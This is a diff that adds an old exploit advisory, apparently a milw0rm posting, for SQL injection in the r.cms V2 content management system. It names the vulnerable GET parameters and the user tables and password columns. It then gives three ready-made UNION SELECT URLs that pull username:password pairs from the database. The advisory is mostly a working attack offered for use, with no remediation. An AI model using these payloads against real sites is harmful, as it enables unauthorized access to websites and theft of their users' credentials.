@@ -1,0 +1,32 @@
+###############################################################
+#
+#           r.cms V2 - Multiple SQL Injection Vulnerabilities 
+#                                                             
+#      Vulnerability discovered by: Lidloses_Auge             
+#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
+#                                   Palme, GPM, Free-Hack
+#      Date:                        16.12.2008
+#
+###############################################################
+#                                                             
+#      Admin Panel: [Target]/rcms/
+#      Description: Almost every GET parameter is vulnerable
+#      				to SQL Injection, so i won't list 'em all.
+#					There are two possible tables which contain
+#					user data, depending on the CMS version.
+#					Table:
+#						rcmsv2
+#					or:
+#						rcms
+#
+#					The Columns for username and password are:
+#						username
+#						userpassword
+#                                                             
+###############################################################
+
+http://xxx/index.php?id=1+union+select+1,2,3,4,5,concat(username,0x3a,userpassword),7,8,9+from+rcmsv2_user/*
+http://xxx/referenzdetail.php?id=-6+union+select+1,2,3,4,5,6,concat(username,0x3a,userpassword),8,9,10,11+from+rcms_user/*
+http://xxx/produkte.php?id=-2+union+select+1,2,3,4,5,6,7,8,concat(username,0x3a,userpassword),10,11+from+rcmsv2_user/*
+
+# milw0rm.com [2008-12-17]
